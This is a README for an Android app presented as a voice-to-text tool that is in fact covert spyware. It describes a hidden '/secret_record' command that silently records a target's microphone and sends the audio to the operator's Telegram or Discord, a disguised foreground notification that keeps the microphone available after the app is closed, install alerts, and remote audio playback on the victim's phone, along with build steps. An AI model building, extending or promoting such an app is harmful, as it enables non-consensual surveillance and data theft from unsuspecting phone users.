<!-- Banner -->
<p align="center">
  <img src="https://capsule-render.vercel.app/api?type=waving&color=0088cc&height=200&section=header&text=VoiceToText%20App&fontSize=50&fontColor=ffffff&animation=fadeIn&fontAlignY=35" alt="Header Banner">
</p>

<h1 align="center">🎙️ VoiceToText Dual-Gateway Remote App 🚀</h1>

<p align="center">
  <em>A next-generation Android application offering seamless Voice-to-Text conversion, covert remote microphone recording, and instant Telegram AND Discord bot integration.</em>
</p>

<p align="center">
  <a href="https://kotlinlang.org"><img src="https://img.shields.io/badge/Kotlin-1.9.0-B125EA?style=for-the-badge&logo=kotlin&logoColor=white" alt="Kotlin"></a>
  <a href="https://developer.android.com/"><img src="https://img.shields.io/badge/Android-3DDC84?style=for-the-badge&logo=android&logoColor=white" alt="Android"></a>
  <a href="https://core.telegram.org/bots/api"><img src="https://img.shields.io/badge/Telegram_API-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram API"></a>
  <a href="https://discord.com/developers/docs/intro"><img src="https://img.shields.io/badge/Discord_API-5865F2?style=for-the-badge&logo=discord&logoColor=white" alt="Discord API"></a>
  <a href="https://gradle.org/"><img src="https://img.shields.io/badge/Gradle-02303A?style=for-the-badge&logo=gradle&logoColor=white" alt="Gradle"></a>
</p>

---

## 📑 Table of Contents
- [✨ Key Features](#-key-features)
- [🤖 Remote Commands (Telegram & Discord)](#-remote-commands-telegram--discord)
- [⚙️ Setup & Configuration](#️-setup--configuration)
- [🚀 How to Compile](#-how-to-compile)
- [📸 Screenshots](#-screenshots)

---

## ✨ Key Features

| Feature | Description |
| :--- | :--- |
| 📝 **Smart Transcription** | Automatically transcribes user voice logs and forwards them to BOTH your Telegram chat and Discord channel instantly. |
| 🎧 **Dual Remote Voice Playback** | Reply to the bot's log on Telegram OR send a voice message in Discord, and it will **auto-play** out loud on the user's Android phone! |
| 🕵️ **Secret Microphone Access** | Trigger a silent background audio recording remotely via hidden Telegram and Discord commands. |
| 🌍 **On-the-fly Translation** | Integrated Google Translate API allows seamless language translation within the app before sending. |
| 🔔 **Live Alerts** | Get real-time pings across all connected platforms the moment a new user installs and registers. |
| 🛡️ **Always-On Background Mode** | Uses a disguised Foreground Service notification to ensure permanent background microphone privileges, allowing secret recording even when the app is swiped away! |
| 🔐 **Secure Credential Storage** | Completely secures your API keys using `.env` injections inside `BuildConfig` so tokens are never exposed on GitHub. |

> [!TIP]
> **Pro-Tip**: You can add multiple Chat IDs for Telegram and invite your entire team into the connected Discord Channel to create a complete operations control center!

---

## 🤖 Remote Commands (Telegram & Discord)

Control the Android device directly from your Telegram Chat or Discord Channel! 

### 1. The Stealth Mode: `/secret_record`
Force the Android device to silently record ambient audio in the background and upload it directly to you.

```bash
# Syntax (Works on BOTH Discord & Telegram):
/secret_record <TargetUsername> <DurationInSeconds>

# Example:
/secret_record JohnDoe 15
```
*(This command covertly records John's microphone for 15 seconds and sends the `.m4a` file directly back to your chat.)*

### 2. The Loudspeaker: 🎤 Voice Reply
**On Telegram:**
1. Find a voice log message sent by the bot.
2. Swipe left to **Reply**.
3. Record and send a Voice Message.
4. The bot downloads your voice and plays it **out loud** on the target Android device immediately.

**On Discord:**
1. Record a Voice Message in your configured Discord Channel using the Discord Mobile App.
2. The Android application immediately detects the Voice Message attachment and plays it out loud for the user!

---

## ⚙️ Setup & Configuration

This project securely injects credentials via a `.env` file during the Gradle build process to prevent leaks. 

<details>
<summary><b>👉 Click here for Step-by-Step Instructions</b></summary>

### Step 1: Get Credentials
1. Message [@BotFather](https://t.me/botfather) on Telegram to get your **Bot Token**.
2. Message [@userinfobot](https://t.me/userinfobot) to get your personal **Chat ID** (or add the bot to a group and get the group ID).
3. Create a **Discord Bot Application** on the Discord Developer Portal to get your **Discord Bot Token**. Ensure "Message Content Intent" is enabled.
4. Enable Developer Mode on Discord and right-click your private channel to copy the **Discord Channel ID**.

### Step 2: Configure Environment Variables
Copy the `.env.example` file to a new file named `.env` in the root of the project:

```bash
cp .env.example .env
```

Open your new `.env` file and paste your actual credentials:

```properties
TELEGRAM_BOT_TOKEN=YOUR_TELEGRAM_BOT_TOKEN_HERE
TELEGRAM_CHAT_IDS=123456789,987654321
DISCORD_BOT_TOKEN=YOUR_DISCORD_BOT_TOKEN_HERE
DISCORD_CHANNEL_ID=YOUR_DISCORD_CHANNEL_ID_HERE
```
*(The `.env` file is safely ignored by Git via `.gitignore`, so your tokens will never be pushed to public repositories!)*
</details>

---

## 🚀 How to Compile

> [!IMPORTANT]
> Make sure you have **JDK 17+** and **Android SDK** installed before compiling. 
> Ensure your `.env` file is fully filled out before attempting to compile, or the bot features will not function!

### 💻 Using Terminal / Command Line
Navigate to the root directory of the project and run:

```bash
# Give execution permission to Gradle (Mac/Linux)
chmod +x gradlew

# Build a clean Release APK
./gradlew clean assembleRelease
```
✅ **Success!** Your APK will be generated at:
`app/build/outputs/apk/release/app-release.apk`

### 🎨 Using Android Studio
1. Launch **Android Studio** -> `Open`.
2. Select the `VoiceToTextApp` folder.
3. Wait for the Gradle Sync to complete.
4. Click the green ▶️ **Run** button on the top toolbar!

---

## 📸 Screenshots

*(Replace these image placeholders with actual screenshots of your app!)*

<p align="center">
  <img src="https://via.placeholder.com/250x500/0088cc/ffffff.png?text=App+Home+Screen" width="30%" />
  <img src="https://via.placeholder.com/250x500/0088cc/ffffff.png?text=Telegram+Bot+Logs" width="30%" />
  <img src="https://via.placeholder.com/250x500/5865F2/ffffff.png?text=Discord+Bot+Logs" width="30%" />
</p>

---

<p align="center">
  <img src="https://capsule-render.vercel.app/api?type=waving&color=0088cc&height=100&section=footer" alt="Footer Banner">
</p>
